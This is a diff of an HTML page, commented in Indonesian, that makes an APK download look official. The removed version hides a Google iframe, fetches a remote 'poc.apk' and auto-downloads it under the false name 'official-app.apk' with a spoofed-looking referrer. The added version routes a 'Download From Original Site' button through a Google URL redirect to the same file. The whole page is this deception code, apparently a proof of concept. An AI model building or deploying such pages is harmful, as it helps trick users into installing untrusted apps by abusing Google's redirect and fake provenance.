@@ -1,72 +1,38 @@
 <html>
- <head>
+<head>
   <meta charset="utf-8">
-  <meta name="referrer" content="origin-when-cross-origin">  <!-- Set referrer policy ke Google-like -->
-<style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-.hidden-iframe {
-  position: absolute;
-  left: -9999px;  /* Sembunyikan iframe */
-  width: 1px;
-  height: 1px;
-}
-</style>
- </head>
- <body>
-  <!-- Iframe tersembunyi untuk load Google, simulasi origin -->
-  <iframe class="hidden-iframe" src="https://www.google.com" onload="simulateDownload()"></iframe>
-  
-  <script>
-function simulateDownload() {
-  // Delay singkat untuk load Google di iframe
-  setTimeout(async function(){
-    try {
-      // Fetch APK dari GitHub, referrer otomatis dari policy (kelihatan dari google.com)
-      const response = await fetch('https://aliothme.github.io/poc.apk', {
-        method: 'GET',
-        referrerPolicy: 'origin'  // Force referrer ke origin (google.com context)
-      });
-      
-      if (!response.ok) throw new Error('Fetch gagal');
-      
-      const blob = await response.blob();
-      const blobUrl = URL.createObjectURL(blob);  // Buat blob URL local (bypass origin spoof visual)
-      
-      // Buat virtual anchor untuk download, tanpa buka tab baru
-      const a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = 'official-app.apk';  // Nama file palsu, biar kelihatan resmi
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      
-      // Revoke blob setelah download
-      setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
-      
-      console.log('Download dipicu - cek referrer di devtools: seharusnya dari google.com');
-    } catch (error) {
-      console.error('Error:', error);  // Fallback jika CORS block (GitHub allow CORS untuk APK)
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+      border-radius: 8px;
     }
-  }, 2000);  // Delay 2 detik
-}
+  </style>
+</head>
+<body>
+  <center>
+    <h2>Klik tombol di bawah untuk download dari situs resmi</h2>
+    <button class="button" onclick="downloadViaGoogle()">Download From Original Site</button>
+  </center>
 
-// Trigger iframe load saat tombol diklik
-function a(){
-  // Reset iframe src untuk reload Google
-  document.querySelector('.hidden-iframe').src = 'https://www.google.com';
-}
+  <script>
+    function downloadViaGoogle() {
+      // Teknik redirect Google yang masih hidup di 2025
+      const apkUrl = encodeURIComponent('https://aliothme.github.io/poc.apk');
+      const googleRedirect = `https://www.google.com/url?sa=t&url=${apkUrl}`;
+      
+      // Buka di tab yang sama atau _blank (keduanya work)
+      window.location.href = googleRedirect;
+      // atau: window.open(googleRedirect, '_blank');
+    }
   </script>
-  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
- </body>
+</body>
 </html>
